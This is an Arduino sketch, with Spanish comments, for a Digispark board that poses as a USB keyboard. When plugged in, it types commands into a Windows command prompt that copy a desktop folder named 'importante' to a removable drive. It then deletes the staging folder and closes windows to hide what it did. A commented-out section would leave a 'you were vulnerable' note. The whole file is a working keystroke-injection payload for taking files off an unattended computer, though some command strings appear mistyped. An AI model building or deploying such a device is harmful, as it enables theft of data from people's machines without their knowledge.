
#include <avr/pgmspace.h>
#include "DigiKeyboard.h"    //libreria de teclado

//String ejemplo1 = "xcopy importante F:";
const char line1[] PROGMEM = "cmd";  // texto para el ejecutar
const char line2[] PROGMEM = "cd desktop";
const char line3[] PROGMEM = "md pruebahack";
const char line4[] PROGMEM = "xcopy importante pruebahack";
const char line5[] PROGMEM = "explorer pruebahack";
const char line6[] PROGMEM = "xcopy importante F>";
//const char line12[] PROGMEM = "&";
//const char line6[] PROGMEM = "xcopy C:\Users\cristian\Desktop\prueba\ F:\prueba2\ /e /h /r";
const char line7[] PROGMEM = "rmdir &S pruebahack"; //elimiacion 
const char line8[] PROGMEM = "s";
const char line9[] PROGMEM = "type con > SIN.txt";
const char line10[] PROGMEM = "FELICIDADES FUISTE BULNERABLE";
const char line11[] PROGMEM = "explorer SIN.txt";
char buffer[256];   // tiempo 

//definicion de variables de teclado
#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
#define KEY_UP_ARROW    0x52
#define KEY_DOWN_ARROW  0x51
#define KEY_LEFT_ARROW    0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI      0xE3
#define KEY_ESC       0x29
#define KEY_TAB       0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);   // envio de pulsacion de tecla
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(char *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();

  DigiKeyboard.delay(1000);

 //ejecutar
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //Tecla inicio(windows) + R

  DigiKeyboard.delay(1000);

  // cmd
  printText(GetPsz(line1));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  //ubicarse en el escritorio
  printText(GetPsz(line2));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  //creacion de la carpeta  
  printText(GetPsz(line3));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  //copiamos todos los archivos
  printText(GetPsz(line4));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  //comprobamos los archivos copiados
  printText(GetPsz(line5));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);
  
  //minimizamos pantallas
  DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
  DigiKeyboard.delay(5000);

  //abrimos ejecutar
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //Tecla inicio(windows) + R
  DigiKeyboard.delay(2000);

  //cmd
  printText(GetPsz(line1));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  //ubicarse en el escritorio
  printText(GetPsz(line2));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //copiamos todos los archivos al USB
   printText(GetPsz(line6));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(20000);

   //eliminar carpeta
   printText(GetPsz(line7));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   printText(GetPsz(line8));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);

   /*creamos y abrimos texto 
   printText(GetPsz(line9));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   printText(GetPsz(line10));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   printText(GetPsz(line11));
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);*/

   //agrandamos texto
   //DigiKeyboard.sendKeyStroke(KEY_UP_ARROW,MOD_CONTROL_LEFT);
   //DigiKeyboard.delay(1000);
   
   //minimizamos pantallas
   DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);

   //reiniciamos el equipo
   DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
   DigiKeyboard.delay(800);
   
   
  


  
  digiEnd();

}
/* Unused endless loop */
void loop() {}
